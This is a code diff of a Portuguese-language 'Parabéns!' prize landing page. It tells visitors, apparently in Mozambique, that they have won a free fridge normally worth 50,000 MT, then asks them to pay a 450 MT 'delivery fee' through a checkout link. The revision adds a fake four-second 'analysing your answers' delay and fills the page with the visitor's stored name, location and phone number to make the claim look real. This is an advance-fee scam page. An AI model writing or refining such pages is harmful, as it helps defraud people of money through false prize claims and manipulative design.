@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Parabéns!</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>A Processar Respostas...</title>
   <style>
     body {
       margin: 0;
@@ -11,129 +11,130 @@
       background: #0d0d0d;
       color: #fff;
       font-family: Arial, sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
+      text-align: center;
     }
 
     .container {
       max-width: 480px;
-      width: 100%;
-      padding-top: 40px;
-      text-align: center;
+      margin: auto;
+      padding-top: 60px;
+    }
+
+    .processando {
+      font-size: 1.3rem;
+      color: #ff4d4d;
+      margin-bottom: 30px;
+    }
+
+    .dots::after {
+      content: '';
+      display: inline-block;
+      width: 1ch;
+      animation: pontinhos 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes pontinhos {
+      0% { content: ''; }
+      25% { content: '.'; }
+      50% { content: '..'; }
+      75% { content: '...'; }
+      100% { content: ''; }
+    }
+
+    .resultado {
+      display: none;
+      animation: fadeIn 2s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
     h1 {
       font-size: 1.8rem;
-      color: #00ff88;
+      color: #33ff66;
       margin-bottom: 20px;
     }
 
-    .mensagem {
-      font-size: 1.2rem;
-      margin-bottom: 20px;
-      color: #ccc;
-    }
-
-    .produto-img {
-      width: 100%;
-      max-width: 300px;
-      border-radius: 10px;
-      margin: 20px 0;
-      box-shadow: 0 0 20px #00ff8855;
-    }
-
-    .alerta {
-      background: #1f1f1f;
-      padding: 18px;
+    .dados {
+      background: #1a1a1a;
+      padding: 20px;
       border-radius: 12px;
-      font-size: 1.05rem;
-      color: #ffdddd;
-      border: 1px solid #ff5555;
-      box-shadow: 0 0 10px #ff1a1a44;
-      margin-bottom: 25px;
+      box-shadow: 0 0 12px #00ff8855;
+      margin-bottom: 30px;
+      text-align: left;
+    }
+
+    .dados strong {
+      color: #33ff66;
     }
 
     .botao {
       background: linear-gradient(45deg, #00cc66, #00994d);
       color: white;
-      padding: 16px;
+      padding: 18px;
       border: none;
       border-radius: 12px;
       font-size: 1.2rem;
       font-weight: bold;
       cursor: pointer;
-      animation: piscar 1.8s infinite;
-      box-shadow: 0 0 18px #00ff8899;
-      width: 100%;
+      animation: piscar 1.5s infinite;
+      box-shadow: 0 0 15px #00ff88aa;
+      display: block;
+      margin: auto;
       max-width: 460px;
+      width: 100%;
       text-decoration: none;
-      display: inline-block;
     }
 
     @keyframes piscar {
-      0%, 100% { opacity: 1; }
+      0% { opacity: 1; }
       50% { opacity: 0.6; }
-    }
-
-    .dados {
-      font-size: 1rem;
-      color: #bbb;
-      margin-top: 25px;
-    }
-
-    .dados span {
-      display: block;
-      margin-bottom: 6px;
+      100% { opacity: 1; }
     }
   </style>
 </head>
 <body>
-  <div class="container" id="conteudo">
-    <h1>🎉 Parabéns!</h1>
-
-    <div class="mensagem" id="mensagemFinal">
-      <strong>Moçambique em Concerto</strong> acaba de confirmar o teu prémio.<br>
-      Estás prestes a receber o teu <strong>produto gratuito</strong>!
+  <div class="container">
+    <div class="processando">
+      ⏳ Estamos a analisar as tuas respostas<span class="dots"></span>
     </div>
 
-    <!-- Imagem do produto escolhido (editar manualmente se quiseres) -->
-    <img src="img/geleira.jpg" alt="Prémio" class="produto-img" />
+    <div class="resultado" id="resultado">
+      <h1>🎉 Parabéns, <span id="nomeClienteSpan"></span>!</h1>
+      <p>Foste seleccionado para receber o teu prémio com entrega directa em tua casa.</p>
 
-    <div class="alerta">
-      Esta <strong>geleira custa normalmente 50.000MT</strong>, mas para o senhor será grátis!<br><br>
-      Só precisa de <strong>confirmar a entrega</strong> pagando a taxa única de <strong>450MT</strong> referente à logística.
+      <div class="dados">
+        <p><strong>📍 Localização:</strong> <span id="zonaClienteSpan"></span></p>
+        <p><strong>📞 Contacto:</strong> <span id="contactoClienteSpan"></span></p>
+      </div>
+
+      <p style="margin-bottom: 30px;">Um dos nossos agentes vai entrar em contacto contigo assim que o pagamento da taxa de entrega for confirmado.</p>
+
+      <a href="https://venduspay.com/checkout.html?id=644" class="botao">
+        ✅ Confirmar Entrega por 450MT
+      </a>
     </div>
-
-    <div class="dados" id="dadosUser">
-      <!-- Dados inseridos previamente -->
-    </div>
-
-    <a href="https://venduspay.com/checkout.html?id=644" class="botao">✅ Confirmar Pagamento de 450MT</a>
   </div>
 
   <script>
-    // Scroll automático após 3 segundos
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        document.getElementById('conteudo').scrollIntoView({ behavior: 'smooth' });
-      }, 3000);
+    // Recuperar dados do localStorage
+    const nome = localStorage.getItem('nomeCliente') || "Cliente";
+    const zona = localStorage.getItem('zonaCliente') || "Zona não definida";
+    const contacto = localStorage.getItem('contactoCliente') || "Sem contacto";
 
-      // Preencher dados do utilizador
-      const nome = localStorage.getItem("nome") || "Cliente";
-      const local = localStorage.getItem("localizacao") || "Não definido";
-      const contacto = localStorage.getItem("contacto") || "Não informado";
+    // Preencher no HTML
+    document.getElementById('nomeClienteSpan').textContent = nome;
+    document.getElementById('zonaClienteSpan').textContent = zona;
+    document.getElementById('contactoClienteSpan').textContent = contacto;
 
-      document.getElementById('dadosUser').innerHTML = `
-        <span><strong>Nome:</strong> ${nome}</span>
-        <span><strong>Localização:</strong> ${local}</span>
-        <span><strong>Contacto:</strong> ${contacto}</span>
-        <p style="margin-top:10px; font-size:0.95rem; color:#aaa;">
-          Este é o número que iremos ligar assim que a nossa equipa estiver próxima da sua zona para entregar o produto.
-        </p>
-      `;
-    });
+    // Mostrar resultado com atraso (efeito de suspense)
+    setTimeout(() => {
+      document.querySelector('.processando').style.display = 'none';
+      document.getElementById('resultado').style.display = 'block';
+      document.getElementById('resultado').scrollIntoView({ behavior: 'smooth' });
+    }, 4000); // 4 segundos de suspense
   </script>
 </body>
 </html>
